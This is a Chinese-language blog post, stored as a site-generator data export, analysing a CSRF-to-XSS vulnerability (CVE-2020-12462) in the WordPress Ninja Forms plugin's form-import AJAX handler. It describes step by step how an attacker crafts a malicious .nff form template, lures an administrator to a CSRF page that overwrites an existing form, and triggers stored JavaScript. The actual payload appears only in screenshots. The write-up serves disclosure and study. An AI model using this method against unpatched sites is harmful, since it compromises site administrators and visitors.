Forms。\n\n![398968d8e7bc9867d3b1a6adbe0116ef.png](https://xzfile.aliyuncs.com/media/upload/picture/20200514154223-72ec2110-95b6-1.png)\n\nNinja Forms 3.4.24.2之前的所有版本中存在一个严重的CSRF to XSS漏洞。成功利用此漏洞可以使得攻击者将WordPress网站中启用的Ninja Forms表单替换为包含恶意JavaScript的表单。当用户使用这些表单时触发xss漏洞。\n\n漏洞分析\n--------\n\n根据漏洞披露来看，本次漏洞存在于ninja-forms\\\\lib\\\\NF_Upgrade.php文件 ninja_forms_ajax_import_form函数\n\n在分析漏洞之前，我们先来了解下这个存在漏洞的文件是做什么用的。存在漏洞的文件名为NF_Upgrade.php，从字面意义上来看，是升级的意思，但这个文件的功能并不是如同其命名（Upgrade）那样用来升级ninja-forms插件版本，而是涉及到ninja-forms的一个特殊功能——“降级” \nNinja Forms插件中存在着一个名为 “降级”的功能。使用该功能用户可以将其表单样式和功能恢复为该插件2.9.x版本\n\n![e20da3119ef76028fa3e3a37be0dbec5.png](https://xzfile.aliyuncs.com/media/upload/picture/20200514154248-81cf7a2e-95b6-1.png)\n\n使用降级后，将删除目前安装的3.0版本的所有表单数据。因此该功能提示用户在使用该功能前导出表单数据。\n\n从后台代码来看，点击降级按钮后，程序启用位于deprecated路径的旧版ninja-forms入口文件\n\n![d9b252ead5e8ee9bde1d7a3cc239442a.png](https://xzfile.aliyuncs.com/media/upload/picture/20200514154307-8cfe46f0-95b6-1.png)\n\n下图是位于deprecated路径的2.x版本ninja-forms入口文件\n\n![6d196c85180ba59685631b8e1c9b7ffb.png](https://xzfile.aliyuncs.com/media/upload/picture/20200514154325-984122c6-95b6-1.png)\n\n作为降级功能的一部分，ninja-forms编写了NF_Upgrade.php文件，文件中AJAX函数旨在在使用“降级”模式时可以导入正常模式中导出的表单\n\n在了解了NF_Upgrade.php文件存在的意义之后，接下来分析下NF_Upgrade.php文件中存在漏洞的ninja_forms_ajax_import_form函数\n\n![eee6a010878b0661a9371499d0782159.png](https://xzfile.aliyuncs.com/media/upload/picture/20200514154351-a7cacbb6-95b6-1.png)\n\nNF_Upgrade.php文件在25行处通过add_action注册了一个连接到ninja_forms_ajax_import_form函数的hook\n\n![e442a1795467ef2a14b76cd3cc69b03a.png](https://xzfile.aliyuncs.com/media/upload/picture/20200514154405-afd8a26a-95b6-1.png)\n\n因此可以通过访问如下链接来触发ninja_forms_ajax_import_form函数\n\n![5e84fa9fe6baff8d6ad03f9354b7b668.png](https://xzfile.aliyuncs.com/media/upload/picture/20200514154422-b9f45b22-95b6-1.png)\n\n在了解了ninja_forms_ajax_import_form函数如何通过请求调用后，继续分析该函数\n\n![2e6cb612e6e60e233185af20d6a7eea7.png](https://xzfile.aliyuncs.com/media/upload/picture/20200514154435-c1ae859a-95b6-1.png)\n\nninja_forms_ajax_import_form函数在27行处检验了用户权限\n\n![2a7d0123d7ca43a51ab4868646bae619.png](https://xzfile.aliyuncs.com/media/upload/picture/20200514154451-cb097988-95b6-1.png)\n\n在29行处获取POST请求中import参数，在31行处获取POST请求中formID参数\n\n![fbf1348147641834fdae1d09dbf3e71c.png](https://xzfile.aliyuncs.com/media/upload/picture/20200514154508-d51adbc4-95b6-1.png)\n\n程序在35行处将POST中提交的import参数与formID参数传入import_form函数中进行导入处理\n\nninja_forms_ajax_import_form函数的作用，从对上文代码的理解，应该是用来给管理员提供导入表单功能用的。\n\n但是ninja_forms_ajax_import_form函数在安全上仅仅校验了使用者的权限，这点确实可以防止未授权访问的发生，但并未校验提交表单中的csrf token进行校验，并不能防范csrf漏洞，因此攻击者可以构造一个恶意页面链接诱骗管理员点击，从而向Ninja Forms插件提交一个导入恶意表单的请求。\n\nninja_forms_ajax_import_form函数接收POST传入的两个参数：import参数与formID参数，import参数中的内容是导入表单的数据，formID参数值是对应的表单id。经过实际测试发现，如果formID参数设置为一个已经存在的表单，则导入的表单内容将会覆盖原有表单。\n\n在测试环境中有如下表单normal_form。攻击者可以通过查看使用该表单的页面源码来获得formID，这里normal_form的formID为2\n\n![895d5b13349ae3e97defd1fac120bf3f.png](https://xzfile.aliyuncs.com/media/upload/picture/20200514154531-e34f99f0-95b6-1.png)\n\nnormal_form是一个简单的单行文本表单\n\n![b97353c9484d2aec2ec15f97e5abad36.png](https://xzfile.aliyuncs.com/media/upload/picture/20200514154547-ecc580f8-95b6-1.png)\n\n如果攻击者向在这个表单中插入一些恶意的js脚本，则可以在攻击时指定POST中formID为2\n\n要覆盖的目标有了，但是导入的数据信息到底怎么构造呢？\n\n回头看下ninja_forms_ajax_import_form函数\n\n![523972b734099bb08d2b20f34fc30993.png](https://xzfile.aliyuncs.com/media/upload/picture/20200514154602-f5de68da-95b6-1.png)\n\nninja_forms_ajax_import_form函数从POST请求中获取import参数，这个值就是导入模板的信息。接着程序将其传入import_form方法中进行导入处理。\n\n$_POST[‘import’]值应该是什么样子的呢？只有知道了这个值的格式，我们才好构造payload\n\n经过一番搜索，位于wp-content\\\\plugins\\\\ninja-forms\\\\ninja-forms.php文件中\n![d639017a1f244b1fdcbafe541c18a57b.png](https://xzfile.aliyuncs.com/media/upload/picture/20200514154616-fe19ec22-95b6-1.png)\n\n我们可以看到如上的代码\n\n可见程序通过template方法读取位于wp-content\\\\plugins\\\\ninja-forms\\\\includes\\\\Templates\\\\\n文件夹的formtemplate-contactform.nff文件内容，并传入import_form接口\n\nformtemplate-contactform.nff文件是这个样子的\n\n![41e9ab63e926d69e4e8f68236a7b98ea.png](https://xzfile.aliyuncs.com/media/upload/picture/20200514154631-0702b3e6-95b7-1.png)\n\n到这里就很好办了，.nff文件正是ninja forms插件导出表单的默认格式。\n\n![097b4271d4bcfb4c33ecec2af1560245.png](https://xzfile.aliyuncs.com/media/upload/picture/20200514154648-10f2fcb2-95b7-1.png)\n\n因此利用思路比较清晰了\n\n1.  攻击者在本地模仿目标表单模板构造一个含有恶意代码的表单模板\n\n2.  通过ninja forms插件将其导出为.nff文件\n\n3.  构造csrf页面，该页面会在管理员访问时发起csrf攻击，使用恶意的表单模板替换原有模板\n\n4.  诱使管理员访问\n\n5.  当用户与管理员使用这个恶意表单的页面时，xss将会被触发\n\n现在已经理清利用思路，接下来构造一个恶意的.nff文件。模仿上文的normal_form表单，攻击者可以构造一个与之相似的恶意表单，与之不同的是，攻击者在描述处加入一行js脚本\n\n![ccbffa34e0f175592e49ef057d5f24ff.png](https://xzfile.aliyuncs.com/media/upload/picture/20200514154709-1d908e8a-95b7-1.png)\n\n攻击者将这个恶意的表单模板导出\n\n![097b4271d4bcfb4c33ecec2af1560245.png](https://xzfile.aliyuncs.com/media/upload/picture/20200514154727-284e1536-95b7-1.png)\n\n导出的恶意表单部分内容如下\n\n![224d79451025a8c36178bfab115c3771.png](https://xzfile.aliyuncs.com/media/upload/picture/20200514154740-2ff963f8-95b7-1.png)\n\n攻击者构造一个表单提交页面，表单提交的地址为http://x.x.x.x/wordpress/wp-admin/admin-ajax.php?action=ninja_forms_ajax_import_form\n提交内容中import值为恶意文件内容、formID值为要覆盖的原normal_form的id，并诱使管理员点击页面链接\n\n当攻击成功后，normal_form表单将会被恶意的表单覆盖\n\n当用户使用该表单进行提交时\n\n![cc91b4c75a04cdc63ff81dde5779063a.png](https://xzfile.aliyuncs.com/media/upload/picture/20200514154755-38ee6cce-95b7-1.png)\n\n点击submit时xss被触发\n\n![31b46fa45c241f800c81f746e79589da.png](https://xzfile.aliyuncs.com/media/upload/picture/20200514154809-4125abaa-95b7-1.png)\n\n不仅如此，当管理员在后台管理编辑该表单时，当进入编辑页面，xss仍然可以被触发\n\n![b6ae533afbf1b1f01c602420752d7ca2.png](https://xzfile.aliyuncs.com/media/upload/picture/20200514154824-49ffe736-95b7-1.png)\n\n\n总结\n----\n\n该漏洞在3.4.24.2版中完全修复。在分析这个漏洞的过程中，发现ninja_forms插件非常的好用，推荐有需要的朋友可以试用下。","source":"_posts/WordPress-Ninja-Forms.md","raw":"---\ntitle: WordPress Ninja Forms插件 CSRF to XSS漏洞（CVE-2020-12462）分析\ntags: web漏洞分析\ncategories: 技术\ncover: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/4a44e04be50baddb294deb2987f7180.jpg\ndate: 2020-05-25 17:26:34\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\n前言\n----\n\nNinja Forms是一款WordPress插件。使用Ninja Forms插件无需编码即可以创建美观、用户友好的WordPress表单。据统计，全球超过 2,000,000 个网站正在使用 Ninja Forms。\n\n![398968d8e7bc9867d3b1a6adbe0116ef.png](https://xzfile.aliyuncs.com/media/upload/picture/20200514154223-72ec2110-95b6-1.png)\n\nNinja Forms 3.4.24.2之前的所有版本中存在一个严重的CSRF to XSS漏洞。成功利用此漏洞可以使得攻击者将WordPress网站中启用的Ninja Forms表单替换为包含恶意JavaScript的表单。当用户使用这些表单时触发xss漏洞。\n\n漏洞分析\n--------\n\n根据漏洞披露来看，本次漏洞存在于ninja-forms\\\\lib\\\\NF_Upgrade.php文件 ninja_forms_ajax_import_form函数\n\n在分析漏洞之前，我们先来了解下这个存在漏洞的文件是做什么用的。存在漏洞的文件名为NF_Upgrade.php，从字面意义上来看，是升级的意思，但这个文件的功能并不是如同其命名（Upgrade）那样用来升级ninja-forms插件版本，而是涉及到ninja-forms的一个特殊功能——“降级” \nNinja Forms插件中存在着一个名为 “降级”的功能。使用该功能用户可以将其表单样式和功能恢复为该插件2.9.x版本\n\n![e20da3119ef76028fa3e3a37be0dbec5.png](https://xzfile.aliyuncs.com/media/upload/picture/20200514154248-81cf7a2e-95b6-1.png)\n\n使用降级后，将删除目前安装的3.0版本的所有表单数据。因此该功能提示用户在使用该功能前导出表单数据。\n\n从后台代码来看，点击降级按钮后，程序启用位于deprecated路径的旧版ninja-forms入口文件\n\n![d9b252ead5e8ee9bde1d7a3cc239442a.png](https://xzfile.aliyuncs.com/media/upload/picture/20200514154307-8cfe46f0-95b6-1.png)\n\n下图是位于deprecated路径的2.x版本ninja-forms入口文件\n\n![6d196c85180ba59685631b8e1c9b7ffb.png](https://xzfile.aliyuncs.com/media/upload/picture/20200514154325-984122c6-95b6-1.png)\n\n作为降级功能的一部分，ninja-forms编写了NF_Upgrade.php文件，文件中AJAX函数旨在在使用“降级”模式时可以导入正常模式中导出的表单\n\n在了解了NF_Upgrade.php文件存在的意义之后，接下来分析下NF_Upgrade.php文件中存在漏洞的ninja_forms_ajax_import_form函数\n\n![eee6a010878b0661a9371499d0782159.png](https://xzfile.aliyuncs.com/media/upload/picture/20200514154351-a7cacbb6-95b6-1.png)\n\nNF_Upgrade.php文件在25行处通过add_action注册了一个连接到ninja_forms_ajax_import_form函数的hook\n\n![e442a1795467ef2a14b76cd3cc69b03a.png](https://xzfile.aliyuncs.com/media/upload/picture/20200514154405-afd8a26a-95b6-1.png)\n\n因此可以通过访问如下链接来触发ninja_forms_ajax_import_form函数\n\n![5e84fa9fe6baff8d6ad03f9354b7b668.png](https://xzfile.aliyuncs.com/media/upload/picture/20200514154422-b9f45b22-95b6-1.png)\n\n在了解了ninja_forms_ajax_import_form函数如何通过请求调用后，继续分析该函数\n\n![2e6cb612e6e60e233185af20d6a7eea7.png](https://xzfile.aliyuncs.com/media/upload/picture/20200514154435-c1ae859a-95b6-1.png)\n\nninja_forms_ajax_import_form函数在27行处检验了用户权限\n\n![2a7d0123d7ca43a51ab4868646bae619.png](https://xzfile.aliyuncs.com/media/upload/picture/20200514154451-cb097988-95b6-1.png)\n\n在29行处获取POST请求中import参数，在31行处获取POST请求中formID参数\n\n![fbf1348147641834fdae1d09dbf3e71c.png](https://xzfile.aliyuncs.com/media/upload/picture/20200514154508-d51adbc4-95b6-1.png)\n\n程序在35行处将POST中提交的import参数与formID参数传入import_form函数中进行导入处理\n\nninja_forms_ajax_import_form函数的作用，从对上文代码的理解，应该是用来给管理员提供导入表单功能用的。\n\n但是ninja_forms_ajax_import_form函数在安全上仅仅校验了使用者的权限，这点确实可以防止未授权访问的发生，但并未校验提交表单中的csrf token进行校验，并不能防范csrf漏洞，因此攻击者可以构造一个恶意页面链接诱骗管理员点击，从而向Ninja Forms插件提交一个导入恶意表单的请求。\n\nninja_forms_ajax_import_form函数接收POST传入的两个参数：import参数与formID参数，import参数中的内容是导入表单的数据，formID参数值是对应的表单id。经过实际测试发现，如果formID参数设置为一个已经存在的表单，则导入的表单内容将会覆盖原有表单。\n\n在测试环境中有如下表单normal_form。攻击者可以通过查看使用该表单的页面源码来获得formID，这里normal_form的formID为2\n\n![895d5b13349ae3e97defd1fac120bf3f.png](https://xzfile.aliyuncs.com/media/upload/picture/20200514154531-e34f99f0-95b6-1.png)\n\nnormal_form是一个简单的单行文本表单\n\n![b97353c9484d2aec2ec15f97e5abad36.png](https://xzfile.aliyuncs.com/media/upload/picture/20200514154547-ecc580f8-95b6-1.png)\n\n如果攻击者向在这个表单中插入一些恶意的js脚本，则可以在攻击时指定POST中formID为2\n\n要覆盖的目标有了，但是导入的数据信息到底怎么构造呢？\n\n回头看下ninja_forms_ajax_import_form函数\n\n![523972b734099bb08d2b20f34fc30993.png](https://xzfile.aliyuncs.com/media/upload/picture/20200514154602-f5de68da-95b6-1.png)\n\nninja_forms_ajax_import_form函数从POST请求中获取import参数，这个值就是导入模板的信息。接着程序将其传入import_form方法中进行导入处理。\n\n$_POST[‘import’]值应该是什么样子的呢？只有知道了这个值的格式，我们才好构造payload\n\n经过一番搜索，位于wp-content\\\\plugins\\\\ninja-forms\\\\ninja-forms.php文件中\n![d639017a1f244b1fdcbafe541c18a57b.png](https://xzfile.aliyuncs.com/media/upload/picture/20200514154616-fe19ec22-95b6-1.png)\n\n我们可以看到如上的代码\n\n可见程序通过template方法读取位于wp-content\\\\plugins\\\\ninja-forms\\\\includes\\\\Templates\\\\\n文件夹的formtemplate-contactform.nff文件内容，并传入import_form接口\n\nformtemplate-contactform.nff文件是这个样子的\n\n![41e9ab63e926d69e4e8f68236a7b98ea.png](https://xzfile.aliyuncs.com/media/upload/picture/20200514154631-0702b3e6-95b7-1.png)\n\n到这里就很好办了，.nff文件正是ninja forms插件导出表单的默认格式。\n\n![097b4271d4bcfb4c33ecec2af1560245.png](https://xzfile.aliyuncs.com/media/upload/picture/20200514154648-10f2fcb2-95b7-1.png)\n\n因此利用思路比较清晰了\n\n1.  攻击者在本地模仿目标表单模板构造一个含有恶意代码的表单模板\n\n2.  通过ninja forms插件将其导出为.nff文件\n\n3.  构造csrf页面，该页面会在管理员访问时发起csrf攻击，使用恶意的表单模板替换原有模板\n\n4.  诱使管理员访问\n\n5.  当用户与管理员使用这个恶意表单的页面时，xss将会被触发\n\n现在已经理清利用思路，接下来构造一个恶意的.nff文件。模仿上文的normal_form表单，攻击者可以构造一个与之相似的恶意表单，与之不同的是，攻击者在描述处加入一行js脚本\n\n![ccbffa34e0f175592e49ef057d5f24ff.png](https://xzfile.aliyuncs.com/media/upload/picture/20200514154709-1d908e8a-95b7-1.png)\n\n攻击者将这个恶意的表单模板导出\n\n![097b4271d4bcfb4c33ecec2af1560245.png](https://xzfile.aliyuncs.com/media/upload/picture/20200514154727-284e1536-95b7-1.png)\n\n导出的恶意表单部分内容如下\n\n![224d79451025a8c36178bfab115c3771.png](https://xzfile.aliyuncs.com/media/upload/picture/20200514154740-2ff963f8-95b7-1.png)\n\n攻击者构造一个表单提交页面，表单提交的地址为http://x.x.x.x/wordpress/wp-admin/admin-ajax.php?action=ninja_forms_ajax_import_form\n提交内容中import值为恶意文件内容、formID值为要覆盖的原normal_form的id，并诱使管理员点击页面链接\n\n当攻击成功后，normal_form表单将会被恶意的表单覆盖\n\n当用户使用该表单进行提交时\n\n![cc91b4c75a04cdc63ff81dde5779063a.png](https://xzfile.aliyuncs.com/media/upload/picture/20200514154755-38ee6cce-95b7-1.png)\n\n点击submit时xss被触发\n\n![31b46fa45c241f800c81f746e79589da.png](https://xzfile.aliyuncs.com/media/upload/picture/20200514154809-4125abaa-95b7-1.png)\n\n不仅如此，当管理员在后台管理编辑该表单时，当进入编辑页面，xss仍然可以被触发\n\n![b6ae533afbf1b1f01c602420752d7ca2.png](https://xzfile.aliyuncs.com/media/upload/picture/20200514154824-49ffe736-95b7-1.png)\n\n\n总结\n----\n\n该漏洞在3.4.24.2版中完全修复。在分析这个漏洞的过程中，发现ninja_forms插件非常的好用，推荐有需要的朋友可以试用下。","slug":"WordPress-Ninja-Forms","published":1,"updated":"2020-10-27T09:25:29.958Z","_id":"ckgrozu8v0020wsa98qq0gzgm","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>Ninja Forms是一款WordPress插件。使用Ninja Forms插件无需编码即可以创建美观、用户友好的WordPress表单。据统计，全球超过 2,000,000 个网站正在使用 Ninja Forms。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200514154223-72ec2110-95b6-1.png\" alt=\"398968d8e7bc9867d3b1a6adbe0116ef.png\"></p>\n<p>Ninja Forms 3.4.24.2之前的所有版本中存在一个严重的CSRF to XSS漏洞。成功利用此漏洞可以使得攻击者将WordPress网站中启用的Ninja Forms表单替换为包含恶意JavaScript的表单。当用户使用这些表单时触发xss漏洞。</p>\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>根据漏洞披露来看，本次漏洞存在于ninja-forms\\lib\\NF_Upgrade.php文件 ninja_forms_ajax_import_form函数</p>\n<p>在分析漏洞之前，我们先来了解下这个存在漏洞的文件是做什么用的。存在漏洞的文件名为NF_Upgrade.php，从字面意义上来看，是升级的意思，但这个文件的功能并不是如同其命名（Upgrade）那样用来升级ninja-forms插件版本，而是涉及到ninja-forms的一个特殊功能——“降级”<br>Ninja Forms插件中存在着一个名为 “降级”的功能。使用该功能用户可以将其表单样式和功能恢复为该插件2.9.x版本</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200514154248-81cf7a2e-95b6-1.png\" alt=\"e20da3119ef76028fa3e3a37be0dbec5.png\"></p>\n<p>使用降级后，将删除目前安装的3.0版本的所有表单数据。因此该功能提示用户在使用该功能前导出表单数据。</p>\n<p>从后台代码来看，点击降级按钮后，程序启用位于deprecated路径的旧版ninja-forms入口文件</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200514154307-8cfe46f0-95b6-1.png\" alt=\"d9b252ead5e8ee9bde1d7a3cc239442a.png\"></p>\n<p>下图是位于deprecated路径的2.x版本ninja-forms入口文件</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200514154325-984122c6-95b6-1.png\" alt=\"6d196c85180ba59685631b8e1c9b7ffb.png\"></p>\n<p>作为降级功能的一部分，ninja-forms编写了NF_Upgrade.php文件，文件中AJAX函数旨在在使用“降级”模式时可以导入正常模式中导出的表单</p>\n<p>在了解了NF_Upgrade.php文件存在的意义之后，接下来分析下NF_Upgrade.php文件中存在漏洞的ninja_forms_ajax_import_form函数</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200514154351-a7cacbb6-95b6-1.png\" alt=\"eee6a010878b0661a9371499d0782159.png\"></p>\n<p>NF_Upgrade.php文件在25行处通过add_action注册了一个连接到ninja_forms_ajax_import_form函数的hook</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200514154405-afd8a26a-95b6-1.png\" alt=\"e442a1795467ef2a14b76cd3cc69b03a.png\"></p>\n<p>因此可以通过访问如下链接来触发ninja_forms_ajax_import_form函数</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200514154422-b9f45b22-95b6-1.png\" alt=\"5e84fa9fe6baff8d6ad03f9354b7b668.png\"></p>\n<p>在了解了ninja_forms_ajax_import_form函数如何通过请求调用后，继续分析该函数</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200514154435-c1ae859a-95b6-1.png\" alt=\"2e6cb612e6e60e233185af20d6a7eea7.png\"></p>\n<p>ninja_forms_ajax_import_form函数在27行处检验了用户权限</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200514154451-cb097988-95b6-1.png\" alt=\"2a7d0123d7ca43a51ab4868646bae619.png\"></p>\n<p>在29行处获取POST请求中import参数，在31行处获取POST请求中formID参数</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200514154508-d51adbc4-95b6-1.png\" alt=\"fbf1348147641834fdae1d09dbf3e71c.png\"></p>\n<p>程序在35行处将POST中提交的import参数与formID参数传入import_form函数中进行导入处理</p>\n<p>ninja_forms_ajax_import_form函数的作用，从对上文代码的理解，应该是用来给管理员提供导入表单功能用的。</p>\n<p>但是ninja_forms_ajax_import_form函数在安全上仅仅校验了使用者的权限，这点确实可以防止未授权访问的发生，但并未校验提交表单中的csrf token进行校验，并不能防范csrf漏洞，因此攻击者可以构造一个恶意页面链接诱骗管理员点击，从而向Ninja Forms插件提交一个导入恶意表单的请求。</p>\n<p>ninja_forms_ajax_import_form函数接收POST传入的两个参数：import参数与formID参数，import参数中的内容是导入表单的数据，formID参数值是对应的表单id。经过实际测试发现，如果formID参数设置为一个已经存在的表单，则导入的表单内容将会覆盖原有表单。</p>\n<p>在测试环境中有如下表单normal_form。攻击者可以通过查看使用该表单的页面源码来获得formID，这里normal_form的formID为2</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200514154531-e34f99f0-95b6-1.png\" alt=\"895d5b13349ae3e97defd1fac120bf3f.png\"></p>\n<p>normal_form是一个简单的单行文本表单</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200514154547-ecc580f8-95b6-1.png\" alt=\"b97353c9484d2aec2ec15f97e5abad36.png\"></p>\n<p>如果攻击者向在这个表单中插入一些恶意的js脚本，则可以在攻击时指定POST中formID为2</p>\n<p>要覆盖的目标有了，但是导入的数据信息到底怎么构造呢？</p>\n<p>回头看下ninja_forms_ajax_import_form函数</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200514154602-f5de68da-95b6-1.png\" alt=\"523972b734099bb08d2b20f34fc30993.png\"></p>\n<p>ninja_forms_ajax_import_form函数从POST请求中获取import参数，这个值就是导入模板的信息。接着程序将其传入import_form方法中进行导入处理。</p>\n<p>$_POST[‘import’]值应该是什么样子的呢？只有知道了这个值的格式，我们才好构造payload</p>\n<p>经过一番搜索，位于wp-content\\plugins\\ninja-forms\\ninja-forms.php文件中<br><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200514154616-fe19ec22-95b6-1.png\" alt=\"d639017a1f244b1fdcbafe541c18a57b.png\"></p>\n<p>我们可以看到如上的代码</p>\n<p>可见程序通过template方法读取位于wp-content\\plugins\\ninja-forms\\includes\\Templates\\<br>文件夹的formtemplate-contactform.nff文件内容，并传入import_form接口</p>\n<p>formtemplate-contactform.nff文件是这个样子的</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200514154631-0702b3e6-95b7-1.png\" alt=\"41e9ab63e926d69e4e8f68236a7b98ea.png\"></p>\n<p>到这里就很好办了，.nff文件正是ninja forms插件导出表单的默认格式。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200514154648-10f2fcb2-95b7-1.png\" alt=\"097b4271d4bcfb4c33ecec2af1560245.png\"></p>\n<p>因此利用思路比较清晰了</p>\n<ol>\n<li><p>攻击者在本地模仿目标表单模板构造一个含有恶意代码的表单模板</p>\n</li>\n<li><p>通过ninja forms插件将其导出为.nff文件</p>\n</li>\n<li><p>构造csrf页面，该页面会在管理员访问时发起csrf攻击，使用恶意的表单模板替换原有模板</p>\n</li>\n<li><p>诱使管理员访问</p>\n</li>\n<li><p>当用户与管理员使用这个恶意表单的页面时，xss将会被触发</p>\n</li>\n</ol>\n<p>现在已经理清利用思路，接下来构造一个恶意的.nff文件。模仿上文的normal_form表单，攻击者可以构造一个与之相似的恶意表单，与之不同的是，攻击者在描述处加入一行js脚本</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200514154709-1d908e8a-95b7-1.png\" alt=\"ccbffa34e0f175592e49ef057d5f24ff.png\"></p>\n<p>攻击者将这个恶意的表单模板导出</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200514154727-284e1536-95b7-1.png\" alt=\"097b4271d4bcfb4c33ecec2af1560245.png\"></p>\n<p>导出的恶意表单部分内容如下</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200514154740-2ff963f8-95b7-1.png\" alt=\"224d79451025a8c36178bfab115c3771.png\"></p>\n<p>攻击者构造一个表单提交页面，表单提交的地址为<a href=\"http://x.x.x.x/wordpress/wp-admin/admin-ajax.php?action=ninja_forms_ajax_import_form\">http://x.x.x.x/wordpress/wp-admin/admin-ajax.php?action=ninja_forms_ajax_import_form</a><br>提交内容中import值为恶意文件内容、formID值为要覆盖的原normal_form的id，并诱使管理员点击页面链接</p>\n<p>当攻击成功后，normal_form表单将会被恶意的表单覆盖</p>\n<p>当用户使用该表单进行提交时</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200514154755-38ee6cce-95b7-1.png\" alt=\"cc91b4c75a04cdc63ff81dde5779063a.png\"></p>\n<p>点击submit时xss被触发</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200514154809-4125abaa-95b7-1.png\" alt=\"31b46fa45c241f800c81f746e79589da.png\"></p>\n<p>不仅如此，当管理员在后台管理编辑该表单时，当进入编辑页面，xss仍然可以被触发</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200514154824-49ffe736-95b7-1.png\" alt=\"b6ae533afbf1b1f01c602420752d7ca2.png\"></p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>该漏洞在3.4.24.2版中完全修复。在分析这个漏洞的过程中，发现ninja_forms插件非常的好用，推荐有需要的朋友可以试用下。</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"excerpt":"","more":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>Ninja Forms是一款WordPress插件。使用Ninja Forms插件无需编码即可以创建美观、用户友好的WordPress表单。据统计，全球超过 2,000,000 个网站正在使用 Ninja Forms。</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200514154223-72ec2110-95b6-1.png\" alt=\"398968d8e7bc9867d3b1a6adbe0116ef.png\"></p>\n<p>Ninja Forms 3.4.24.2之前的所有版本中存在一个严重的CSRF to XSS漏洞。成功利用此漏洞可以使得攻击者将WordPress网站中启用的Ninja Forms表单替换为包含恶意JavaScript的表单。当用户使用这些表单时触发xss漏洞。</p>\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>根据漏洞披露来看，本次漏洞存在于ninja-forms\\lib\\NF_Upgrade.php文件 ninja_forms_ajax_import_form函数</p>\n<p>在分析漏洞之前，我们先来了解下这个存在漏洞的文件是做什么用的。存在漏洞的文件名为NF_Upgrade.php，从字面意义上来看，是升级的意思，但这个文件的功能并不是如同其命名（Upgrade）那样用来升级ninja-forms插件版本，而是涉及到ninja-forms的一个特殊功能——“降级”<br>Ninja Forms插件中存在着一个名为 “降级”的功能。使用该功能用户可以将其表单样式和功能恢复为该插件2.9.x版本</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200514154248-81cf7a2e-95b6-1.png\" 